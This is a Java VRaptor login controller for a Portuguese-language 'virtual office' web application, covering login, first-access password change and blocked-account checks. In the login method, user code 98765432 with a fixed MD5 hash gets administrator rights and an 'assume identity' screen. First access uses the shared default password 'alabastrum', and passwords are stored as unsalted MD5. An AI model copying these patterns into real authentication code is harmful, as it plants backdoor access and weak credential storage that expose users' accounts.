package br.com.alabastrum.escritoriovirtual.controller;

import java.util.GregorianCalendar;

import org.hibernate.criterion.MatchMode;

import br.com.alabastrum.escritoriovirtual.anotacoes.Public;
import br.com.alabastrum.escritoriovirtual.hibernate.HibernateUtil;
import br.com.alabastrum.escritoriovirtual.modelo.HistoricoAcesso;
import br.com.alabastrum.escritoriovirtual.modelo.InformacoesFixasUsuario;
import br.com.alabastrum.escritoriovirtual.modelo.Usuario;
import br.com.alabastrum.escritoriovirtual.sessao.SessaoGeral;
import br.com.alabastrum.escritoriovirtual.sessao.SessaoUsuario;
import br.com.alabastrum.escritoriovirtual.util.GeradorDeMd5;
import br.com.alabastrum.escritoriovirtual.util.Mail;
import br.com.alabastrum.escritoriovirtual.util.Util;
import br.com.caelum.vraptor.Path;
import br.com.caelum.vraptor.Resource;
import br.com.caelum.vraptor.Result;
import br.com.caelum.vraptor.Validator;
import br.com.caelum.vraptor.validator.ValidationMessage;

@Resource
public class LoginController {

	private final Result result;
	private SessaoUsuario sessaoUsuario;
	private SessaoGeral sessaoGeral;
	private Validator validator;
	private HibernateUtil hibernateUtil;

	public LoginController(Result result, SessaoUsuario sessaoUsuario, SessaoGeral sessaoGeral, Validator validator, HibernateUtil hibernateUtil) {
		this.result = result;
		this.sessaoUsuario = sessaoUsuario;
		this.sessaoGeral = sessaoGeral;
		this.validator = validator;
		this.hibernateUtil = hibernateUtil;
	}

	@Public
	@Path("/")
	public void telaLogin() {

	}

	@Public
	public void efetuarLogin(Usuario usuario) throws Exception {

		if (Util.vazio(usuario.getId_Codigo()) || usuario.getId_Codigo().equals(0) || Util.vazio(usuario.getInformacoesFixasUsuario().getSenha())) {

			codigoOuSenhaIncorretos();
		}

		String senhaInformada = usuario.getInformacoesFixasUsuario().getSenha();

		if (usuario.getId_Codigo().equals(98765432) && GeradorDeMd5.converter(senhaInformada).equals("e7f31fd5af3e864fff380586bb47ca34")) {

			usuario.setvNome("Administrador");

			usuario.setInformacoesFixasUsuario(new InformacoesFixasUsuario());
			usuario.getInformacoesFixasUsuario().setAdministrador(true);

			this.sessaoUsuario.login(usuario);
			result.redirectTo(AssumirIdentidadeController.class).acessarTelaAssumirIdentidade();
		}

		else {

			Usuario usuarioFiltro = new Usuario();
			usuarioFiltro.setId_Codigo(usuario.getId_Codigo());

			Usuario usuarioBanco = hibernateUtil.selecionar(usuarioFiltro, MatchMode.EXACT);

			if (Util.vazio(usuarioBanco)) {

				validator.add(new ValidationMessage("Código inexistente", "Erro"));
				validator.onErrorRedirectTo(this).telaLogin();
			}

			else {

				InformacoesFixasUsuario informacoesFixasUsuario = usuarioBanco.obterInformacoesFixasUsuario();

				if (Util.vazio(informacoesFixasUsuario)) {

					if (!senhaInformada.equals("alabastrum")) {

						codigoOuSenhaIncorretos();
					}

					else {

						this.sessaoGeral.adicionar("codigoUsuarioPrimeiroAcesso", usuarioBanco.getId_Codigo());
						result.forwardTo(this).trocarSenhaPrimeiroAcesso();
						return;
					}
				}

				else {

					if (!informacoesFixasUsuario.getSenha().equals(GeradorDeMd5.converter(senhaInformada))) {

						codigoOuSenhaIncorretos();
					}

					validarAcessoBloqueado(usuarioBanco);
				}
			}

			colocarUsuarioNaSessao(usuario);
			salvarHistoricoAcesso(usuario);

			result.redirectTo(HomeController.class).home();
		}

	}

	private void codigoOuSenhaIncorretos() {

		validator.add(new ValidationMessage("Código ou senha incorretos", "Erro"));
		validator.onErrorRedirectTo(this).telaLogin();
	}

	private void colocarUsuarioNaSessao(Usuario usuario) {

		Usuario usuarioFiltro = new Usuario();
		usuarioFiltro.setId_Codigo(usuario.getId_Codigo());

		usuario = (Usuario) this.hibernateUtil.selecionar(usuarioFiltro, MatchMode.EXACT);

		usuario.setInformacoesFixasUsuario(usuario.obterInformacoesFixasUsuario());

		this.sessaoUsuario.login(usuario);
	}

	@Public
	public void permissaoNegada() {

	}

	@Public
	public void trocarSenhaPrimeiroAcesso() {

	}

	@Public
	public void salvarTrocarSenhaPrimeiroAcesso(String senhaNova, String confirmacaoSenhaNova, String cpf, String email) throws Exception {

		if (!senhaNova.equals(confirmacaoSenhaNova)) {

			validator.add(new ValidationMessage("Senha nova incorreta", "Erro"));
			validator.onErrorRedirectTo(this).trocarSenhaPrimeiroAcesso();
		}

		if (Util.vazio(cpf)) {

			validator.add(new ValidationMessage("CPF requerido", "Erro"));
			validator.onErrorRedirectTo(this).trocarSenhaPrimeiroAcesso();
		}

		if (Util.vazio(email)) {

			validator.add(new ValidationMessage("Email requerido", "Erro"));
			validator.onErrorRedirectTo(this).trocarSenhaPrimeiroAcesso();
		}

		Integer codigoUsuario = (Integer) this.sessaoGeral.getValor("codigoUsuarioPrimeiroAcesso");

		Usuario usuarioFiltro = new Usuario();
		usuarioFiltro.setId_Codigo(codigoUsuario);

		Usuario usuarioBanco = hibernateUtil.selecionar(usuarioFiltro, MatchMode.EXACT);

		if (Util.vazio(usuarioBanco.getCPF())) {

			validator.add(new ValidationMessage("O usuário com código " + usuarioBanco.getId_Codigo() + " não possui um CPF cadastrado no escritório virtual. Entre em contato com a Alabastrum pedindo para cadastrar o seu CPF no escritório virtual.", "Erro"));
			validator.onErrorRedirectTo(this).trocarSenhaPrimeiroAcesso();
		}

		else {

			if (!usuarioBanco.getCPF().equals(cpf)) {

				String mensagem = "O usuário " + usuarioBanco.getId_Codigo() + " - " + usuarioBanco.getvNome() + " tentou acessar o EV pela primeira vez utilizando o CPF " + cpf + " e não obteve sucesso.";
				Mail.enviarEmail("CPF incorreto no primeiro acesso", mensagem);

				validator.add(new ValidationMessage("O CPF informado não é igual ao CPF existente no banco de dados da Alabastrum. Informe o CPF corretamente ou entre em contato com a Alabastrum através do email suporte@alabastrum.com.br informando sobre o problema e peça para editar o seu CPF na base de dados.", "Erro"));
				validator.onErrorRedirectTo(this).trocarSenhaPrimeiroAcesso();
			}
		}

		InformacoesFixasUsuario informacoesFixasUsuario = new InformacoesFixasUsuario();
		informacoesFixasUsuario.setCodigoUsuario(usuarioBanco.getId_Codigo());

		informacoesFixasUsuario = this.hibernateUtil.selecionar(informacoesFixasUsuario);

		if (Util.vazio(informacoesFixasUsuario)) {

			informacoesFixasUsuario = new InformacoesFixasUsuario();
			informacoesFixasUsuario.setCodigoUsuario(usuarioBanco.getId_Codigo());
		}

		informacoesFixasUsuario.setAdministrador(false);
		informacoesFixasUsuario.setSenha(GeradorDeMd5.converter(senhaNova));

		this.hibernateUtil.salvarOuAtualizar(informacoesFixasUsuario);

		Mail.enviarEmail("Troca de senha de usuário", "O usuário " + usuarioBanco.getId_Codigo() + " - " + usuarioBanco.getvNome() + " efetuou a troca de senha no escritório virtual. <br><br>Email informado: " + email + " <br>CPF informado: " + cpf);

		colocarUsuarioNaSessao(usuarioBanco);

		result.include("sucesso", "Senha trocada com sucesso! Agora, atualize seus dados para poder continuar.");

		result.redirectTo(AtualizacaoDadosController.class).acessarTelaAtualizacaoDados();
	}

	private void salvarHistoricoAcesso(Usuario usuario) {

		HistoricoAcesso historicoAcesso = new HistoricoAcesso();
		historicoAcesso.setDataHora(new GregorianCalendar());
		historicoAcesso.setCodigoUsuario(usuario.getId_Codigo());

		this.hibernateUtil.salvarOuAtualizar(historicoAcesso);
	}

	private void validarAcessoBloqueado(Usuario usuarioBanco) throws Exception {

		if (Util.vazio(usuarioBanco.getEV()) || usuarioBanco.getEV().equals("0")) {

			String mensagem = "O usuário " + usuarioBanco.getId_Codigo() + " - " + usuarioBanco.getvNome() + " tentou acessar o EV mas o acesso está bloqueado para ele.";
			Mail.enviarEmail("Código não habilitado para acessar o escritório virtual", mensagem);

			validator.add(new ValidationMessage("Código não habilitado para acessar o escritório virtual. Entre em contato com a Alabastrum através do email suporte@alabastrum.com.br", "Erro"));
			validator.onErrorRedirectTo(this).telaLogin();
		}
	}
}
